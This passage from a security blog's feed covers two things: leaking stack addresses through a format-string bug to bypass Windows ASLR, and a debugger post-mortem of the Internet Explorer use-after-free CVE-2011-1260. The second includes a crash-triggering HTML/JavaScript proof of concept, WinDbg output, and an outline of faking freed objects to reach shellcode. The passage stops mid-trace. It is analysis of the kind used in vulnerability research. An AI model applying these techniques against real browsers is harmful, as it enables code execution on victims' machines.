long.&lt;/textarea&gt; &lt;br /&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;It would appear as if there are some saved frame pointers, function arguments, local variables, and return pointers here. Let's do some more analysis to be more certain:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;I ran the above command 20 times and truncated everything but a portion of the lower part of the stack, which yielded the following:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;span style="font-size: x-small;"&gt;:00000081:00&lt;b style="color: red;"&gt;11EC04&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;11EC04&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;16B8C8&lt;/b&gt;:00010000:... &lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;1AE7C0&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;1AE7C0&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;1DB34A&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;18EB10&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;18EB10&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;1FBFA9&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;12E614&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;12E614&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;15B27C&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;1FEAB4&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;1FEAB4&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;18BE92&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;15E780&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;15E780&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;12B055&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;18E608&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;18E608&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;1FB18C&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;0DEC88&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;0DEC88&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;0ABB3B&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;09EB10&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;09EB10&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;0EBC61&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;18EB18&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;18EB18&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;1FBC38&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;0BE71C&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;0BE71C&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;0CB1D3&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;0BE8F4&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;0BE8F4&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;0CBE79&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;12E954&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;12E954&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;15BFE8&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;0AE8D8&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;0AE8D8&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;0DBEB3&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;1CEA90&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;1CEA90&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;1BBCB9&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;08E4F4&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;08E4F4&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;0FBD2C&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;1EEA1C&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;1EEA1C&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;19B39B&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;0EE95C&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;0EE95C&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;09B1AD&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;19E7F8&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;19E7F8&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;1EBF57&lt;/b&gt;:00010000:...&lt;br /&gt;:00000081:00&lt;b style="color: red;"&gt;0BE574&lt;/b&gt;:000000CB:00010000:00010580:00&lt;b style="color: red;"&gt;0BE574&lt;/b&gt;:77B46FEA:77B47026:79&lt;b style="color: red;"&gt;0CBD2A&lt;/b&gt;:00010000:...&lt;/span&gt;&lt;/div&gt;&lt;div style="text-align: left;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Look at the dwords 2, 6, and 9. The last 6 bytes are different after each run. This result is consistant with the ASLR implementation of 14 bits of entropy in the stack. So now we've positively identified heap, and stack addresses (process or thread). Now, notice dwords 7-8. The addresses do not change and they are consistant with addresses to loaded modules. To prove this, if you rebooted, and analyzed the same portion of the stack, the addresses would be different since loaded modules are only randomized after reboots.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;b&gt;Conclusion:&lt;/b&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;With just a little bit of context, you can easily infer the type of data/code on the stack. In fact, ASLR actually helps in determining the difference between the stack, heap, PEB, and image base (loaded module code) due to the difference in entropy bits.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;This serves as an example where memory leaks coupled with memory corruption despite modern exploit mitigations will very likely lead to code execution. In the context of a format string vulnerability, even if %n is disabled, at the very minimum, shellcode can be placed into memory via the format string. Given any combination of vulnerabilties, the exploitation possibilities are numerous. However, increasingly, with all the modern exploit mitigations, exploitation is becoming very application-specific.&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;As a refresher here are some useful addresses in memory can help lead to code execution:&lt;/div&gt;&lt;ul&gt;&lt;li&gt;FS:[0] - Pointer to the SEH chain&lt;/li&gt;&lt;li&gt;FS:[30] - Pointer to the PEB&lt;/li&gt;&lt;li&gt;Executable's .data + 4 offset: master GS cookie&lt;/li&gt;&lt;li&gt;PEB+20: FastPEBLock pointer&lt;/li&gt;&lt;li&gt;PEB+24: FastPEBUnlock&lt;/li&gt;&lt;li&gt;Stack return pointers: duh&lt;/li&gt;&lt;li&gt;Function pointers&lt;/li&gt;&lt;li&gt;C++ Vtables &lt;/li&gt;&lt;/ul&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;Links for reference:&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: left;"&gt;&lt;a name="1"&gt;&lt;/a&gt;1. Microsoft, "Format Specification Fields: printf and wprintf Functions," &lt;a href="http://msdn.microsoft.com/en-us/library/56e442dc.aspx"&gt;http://msdn.microsoft.com/en-us/library/56e442dc.aspx&lt;/a&gt;&lt;/div&gt;&lt;div style="text-align: left;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: left;"&gt;&lt;a name="2"&gt;&lt;/a&gt;2. O. Whitehouse, "An Analysis of Address Space Layout Randomization on Windows Vista™," 2007, &lt;a href="http://www.symantec.com/avcenter/reference/Address_Space_Layout_Randomization.pdf"&gt;http://www.symantec.com/avcenter/reference/Address_Space_Layout_Randomization.pdf&lt;/a&gt;&lt;/div&gt;&lt;div style="text-align: left;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: left;"&gt;3. P. Haas, "Advanced Format String Attacks," 2010, &lt;a href="http://defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf"&gt;http://defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf&lt;/a&gt;&lt;/div&gt;&lt;div class="blogger-post-footer"&gt;&lt;img alt="" height="1" src="https://blogger.googleusercontent.com/tracker/6052198192158185644-5818290250132367839?l=exploit-monday.com" width="1" /&gt;&lt;/div&gt;</description><pubDate>Mon, 20 Jun 2011 22:19:00 +0000</pubDate></item><item><title>Post-mortem Analysis of a Use-After-Free Vulnerability (CVE-2011-1260)</title><link>http://www.exploit-monday.com/2011/07/post-mortem-analysis-of-use-after-free_07.html</link><description>Recently, I've been looking into the exploitation of use-after-free vulnerabilities. This class of bug is very application specific, but armed with just the right amount of knowledge these vulnerabilities can be exploited to bypass most modern OS exploit mitigations. After reading Nephi Johnson's (@d0c_s4vage) excellent article[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#3_1"&gt;1&lt;/a&gt;] on exploiting an IE use-after-free vulnerability, I decided to ride his coattails and show the steps I used to analyze his proof-of-concept crash code.&lt;br /&gt;&lt;br /&gt;As shown in his blog post, here is Nephi's test case that crashes IE:&lt;br /&gt;&lt;pre&gt;&lt;textarea readonly="readonly" rows="10" wrap="off"&gt;&amp;lt;html&amp;gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;body&amp;gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;script language='javascript'&amp;gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; document.body.innerHTML += "&amp;lt;object align='right' hspace='1000'&amp;nbsp;&amp;nbsp; width='1000'&amp;gt;TAG_1&amp;lt;/object&amp;gt;";&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; document.body.innerHTML += "&amp;lt;a id='tag_3' style='bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px' &amp;gt;TAG_3&amp;lt;/a&amp;gt;";&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; document.body.innerHTML += "AAAAAAA";&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; document.body.innerHTML += "&amp;lt;strong style='font-size:1000pc;margin:auto -1000cm auto auto;' dir='ltr'&amp;gt;TAG_11&amp;lt;/strong&amp;gt;";&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/script&amp;gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/body&amp;gt;&lt;br /&gt;&amp;lt;/html&amp;gt;&lt;/textarea&gt;&lt;/pre&gt;Internet Explorer crashes at mshtml!CElement::Doc+0x2&lt;br /&gt;&lt;br /&gt;&lt;div&gt;76c.640): Access violation - code c0000005 (first chance)&lt;/div&gt;&lt;div&gt;First chance exceptions are reported before any exception handling.&lt;/div&gt;&lt;div&gt;This exception may be expected and handled.&lt;/div&gt;&lt;div&gt;eax=00000000 ebx=004aedc0 ecx=004e00e9 edx=00000000 esi=0209e138 edi=00000000&lt;/div&gt;&lt;div&gt;eip=6d55c402 esp=0209e10c ebp=0209e124 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;/div&gt;&lt;div&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00010246&lt;/div&gt;&lt;div&gt;mshtml!CElement::Doc+0x2:&lt;/div&gt;&lt;div&gt;6d55c402 8b5070&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,dword ptr [eax+70h] ds:0023:00000070=????????&lt;/div&gt;&lt;br /&gt;Here is the order of execution leading to the crash:&lt;br /&gt;&lt;br /&gt;&lt;div&gt;mshtml!CTreeNode::ComputeFormats+0x42&lt;/div&gt;&lt;div&gt;6d58595a 8b0b&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,dword ptr [ebx]&lt;/div&gt;&lt;div&gt;6d58595c e89f6afdff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; mshtml!CElement::Doc (6d55c400)&lt;/div&gt;&lt;div&gt;mshtml!CElement::Doc:&lt;/div&gt;&lt;div&gt;6d55c400 8b01&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [ecx]&lt;/div&gt;&lt;div&gt;6d55c402 8b5070&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,dword ptr [eax+70h] ds:0023:00000070=????????&lt;/div&gt;&lt;div&gt;6d55c405 ffd2&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; edx&lt;/div&gt;&lt;br /&gt;This is a classic C++ use-after-free vulnerability. IE is trying to call a function within a previously freed object's virtual function table. In the disassembly above, a pointer to some object [EBX] has a pointer to its virtual function table [ECX] that subsequently calls a function at offset 0x70 in its vftable [EAX+0x70].&lt;br /&gt;&lt;br /&gt;What we need to find out is what type of object was freed and how many bytes get allocated for that object. That way, we can craft fake objects of that size (using javascript) whose vftable at offset 0x70 point to our shellcode.&lt;br /&gt;&lt;br /&gt;Since mshtml!CTreeNode::ComputeFormats+0x42 points to the object in question (in EBX), I set a breakpoint in Windbg on that instruction and got the following:&lt;br /&gt;&lt;pre&gt;&lt;textarea readonly="readonly" rows="20" wrap="off"&gt;BP mshtml!CTreeNode::ComputeFormats+0x42 10 ".printf \"Object Pointer:\\t%08x\\nVFTable Pointer:\\t%08x\\nVFTable:\\t\\t%08x\\nObject Type:\\n\", ebx, poi(ebx), poi(poi(ebx)); ln poi(poi(ebx)); g"&lt;br /&gt;&lt;br /&gt;0:013&amp;gt; g&lt;br /&gt;Object Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;00608808&lt;br /&gt;VFTable Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;00611890&lt;br /&gt;VFTable:&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;6caf1e40&lt;br /&gt;Object Type:&lt;br /&gt;(6caf1e40)&amp;nbsp;&amp;nbsp; mshtml!CObjectElement::`vftable'&amp;nbsp;&amp;nbsp; |&amp;nbsp; (6cbf9270)&amp;nbsp;&amp;nbsp; mshtml!CDummyUnknown::`vftable'&lt;br /&gt;Exact matches:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; mshtml!CObjectElement::`vftable' = &amp;lt;no type information&amp;gt;&lt;br /&gt;Object Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;005c55e8&lt;br /&gt;VFTable Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;005b4338&lt;br /&gt;VFTable:&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;6cb96670&lt;br /&gt;Object Type:&lt;br /&gt;(6cb96670)&amp;nbsp;&amp;nbsp; mshtml!CBodyElement::`vftable'&amp;nbsp;&amp;nbsp; |&amp;nbsp; (6cbf9108)&amp;nbsp;&amp;nbsp; mshtml!CCaret::`vftable'&lt;br /&gt;Exact matches:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; mshtml!CBodyElement::`vftable' = &amp;lt;no type information&amp;gt;&lt;br /&gt;Object Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;00608808&lt;br /&gt;VFTable Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;00611890&lt;br /&gt;VFTable:&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;6caf1e40&lt;br /&gt;Object Type:&lt;br /&gt;(6caf1e40)&amp;nbsp;&amp;nbsp; mshtml!CObjectElement::`vftable'&amp;nbsp;&amp;nbsp; |&amp;nbsp; (6cbf9270)&amp;nbsp;&amp;nbsp; mshtml!CDummyUnknown::`vftable'&lt;br /&gt;Exact matches:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; mshtml!CObjectElement::`vftable' = &amp;lt;no type information&amp;gt;&lt;br /&gt;Object Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;00608a18&lt;br /&gt;VFTable Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;005c2ac8&lt;br /&gt;VFTable:&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;6ca47dd8&lt;br /&gt;Object Type:&lt;br /&gt;(6ca47dd8)&amp;nbsp;&amp;nbsp; mshtml!CAnchorElement::`vftable'&amp;nbsp;&amp;nbsp; |&amp;nbsp; (6ca48020)&amp;nbsp;&amp;nbsp; mshtml!CFontElement::`vftable'&lt;br /&gt;Exact matches:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; mshtml!CAnchorElement::`vftable' = &amp;lt;no type information&amp;gt;&lt;br /&gt;Object Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;00608ac8&lt;br /&gt;VFTable Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;005d6f68&lt;br /&gt;VFTable:&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;6ca470e0&lt;br /&gt;Object Type:&lt;br /&gt;(6ca470e0)&amp;nbsp;&amp;nbsp; mshtml!CPhraseElement::`vftable'&amp;nbsp;&amp;nbsp; |&amp;nbsp; (6ca47308)&amp;nbsp;&amp;nbsp; mshtml!CBlockElement::`vftable'&lt;br /&gt;Exact matches:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; mshtml!CPhraseElement::`vftable' = &amp;lt;no type information&amp;gt;&lt;br /&gt;Object Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;00608808&lt;br /&gt;VFTable Pointer:&amp;nbsp;&amp;nbsp; &amp;nbsp;00610023&lt;br /&gt;VFTable:&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;00000000&lt;br /&gt;Object Type:&lt;br /&gt;(274.418): Access violation - code c0000005 (first chance)&lt;br /&gt;First chance exceptions are reported before any exception handling.&lt;br /&gt;This exception may be expected and handled.&lt;br /&gt;eax=00000000 ebx=00608808 ecx=00610023 edx=00000000 esi=0207e0b8 edi=00000000&lt;br /&gt;eip=6cbfc402 esp=0207e08c ebp=0207e0a4 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00010246&lt;br /&gt;mshtml!CElement::Doc+0x2:&lt;br /&gt;6cbfc402 8b5070&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,dword ptr [eax+70h] ds:0023:00000070=????????&lt;/textarea&gt;&lt;/pre&gt;As can be seen above, EBX points to a freed CObjectElement object. How can we know for sure that the object was freed and that it points to a CObjectElement object? Enabling the page heap and user stack traces of every call to malloc and free will do the trick. This technique also allows us to observe the size allocated to CObjectElement.&lt;br /&gt;&lt;pre&gt;&lt;textarea readonly="readonly" rows="20" wrap="off"&gt;gflags /i iexplore.exe +hpa +ust&lt;br /&gt;&lt;br /&gt;C:\Users\Temp\Desktop&amp;gt;gflags /i iexplore.exe +hpa +ust&lt;br /&gt;Current Registry Settings for iexplore.exe executable are: 02001000&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ust - Create user mode stack trace database&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; hpa - Enable page heap&lt;br /&gt;&lt;br /&gt;BP mshtml!CTreeNode::ComputeFormats+0x42 12 "!heap -p -a poi(ebx); g"&lt;br /&gt;&lt;br /&gt;...&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; address 070ccf20 found in&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; _DPH_HEAP_ROOT @ 151000&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; in busy allocation (&amp;nbsp; DPH_HEAP_BLOCK:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; UserAddr&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; UserSize -&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; VirtAddr&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; VirtSize)&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ec31d4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 70ccf20&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; e0 -&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 70cc000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2000&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mshtml!CObjectElement::`vftable'&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ed98e89 verifier!AVrfDebugPageHeapAllocate+0x00000229&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 771e5c4e ntdll!RtlDebugAllocateHeap+0x00000030&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 771a7e5e ntdll!RtlpAllocateHeap+0x000000c4&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 771734df ntdll!RtlAllocateHeap+0x0000023a&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bec1da3 mshtml!CObjectElement::CreateElement+0x00000018&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf54be9 mshtml!CreateElement+0x00000043&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf58961 mshtml!CHtmParse::ParseBeginTag+0x000000e3&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf56e93 mshtml!CHtmParse::ParseToken+0x00000082&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf575c9 mshtml!CHtmPost::ProcessTokens+0x00000237&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf478e8 mshtml!CHtmPost::Exec+0x00000221&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf178ae mshtml!CHtmLoad::Init+0x0000033c&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bfdc444 mshtml!CDwnInfo::SetLoad+0x0000011b&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bfdc348 mshtml!CDwnCtx::SetLoad+0x0000007a&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bfdda01 mshtml!CHtmCtx::SetLoad+0x00000013&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf5be5f mshtml!CMarkup::Load+0x00000167&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf1746e mshtml!CMarkup::Load+0x000000ee&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf181c3 mshtml!CDoc::ParseHtmlStream+0x000000ce&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf17a5b mshtml!InjectHtmlStream+0x000000fd&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf1793e mshtml!HandleHTMLInjection+0x0000005c&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf171fa mshtml!CElement::InjectInternal+0x00000307&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf1704a mshtml!CElement::InjectCompatBSTR+0x00000046&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bf1988c mshtml!CElement::put_innerHTML+0x00000040&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6c0572d6 mshtml!GS_BSTR+0x000001ac&lt;br 